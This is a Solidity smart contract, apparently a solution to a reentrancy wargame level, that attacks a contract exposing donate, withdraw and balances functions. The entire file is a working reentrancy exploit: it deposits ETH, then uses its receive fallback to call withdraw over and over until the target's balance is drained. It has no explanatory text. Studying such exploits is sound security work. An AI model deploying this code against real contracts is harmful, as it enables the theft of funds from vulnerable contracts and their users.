// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balances(address) external view returns (uint256);
}

contract ReentranceAttacker {
    IReentrance public target;

    constructor(address payable _target) public {
        target = IReentrance(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");

        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 remaining = address(address(target)).balance;
        uint256 recordedBalance = target.balances(address(this));
        uint256 amount = remaining < recordedBalance
            ? remaining
            : recordedBalance;

        if (amount > 0) {
            target.withdraw(amount);
        }
    }
}
